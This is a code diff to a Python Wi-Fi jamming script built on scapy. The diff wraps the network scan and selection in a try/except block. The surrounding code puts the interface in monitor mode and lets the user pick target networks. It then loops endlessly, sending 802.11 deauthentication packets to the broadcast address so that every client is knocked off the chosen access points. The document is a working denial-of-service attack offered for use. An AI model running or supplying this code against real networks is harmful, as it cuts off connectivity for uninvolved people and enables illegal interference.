@@ -53,24 +53,24 @@ def choose_from_networks(networks=networks) -> list:
     choice = str(input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n > '))
     for index in choice.split(' '):
         selection.append(networks[menu_items[int(index)]])
-
     return selection
 
 def jam_network(ap:str, client:str, iface=iface):
     deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
     sendp(deauth_packet, iface=iface)
 
-stop_thread = False
-channel_changer = Thread(target=change_channel)
-channel_changer.daemon = True
-channel_changer.start()
-monitor('on')
-sniff(prn=callback_ap, iface=iface, timeout=10)
-stop_thread = True
-channel_changer.join(timeout=1)
+try :
+    channel_changer = Thread(target=change_channel)
+    channel_changer.daemon = True
+    channel_changer.start()
+    monitor('on')
+    sniff(prn=callback_ap, iface=iface, timeout=10)
+    channel_changer.join(timeout=1)
+    ap_list = choose_from_networks()
+    client = 'ff:ff:ff:ff:ff:ff'
+except :
+    monitor('off')
 
-ap_list = choose_from_networks()
-client = 'ff:ff:ff:ff:ff:ff'
 
 try:
     while True:
@@ -78,4 +78,5 @@ try:
             jam_network(ap, client)
 except KeyboardInterrupt:
     pass
+
 monitor('off')
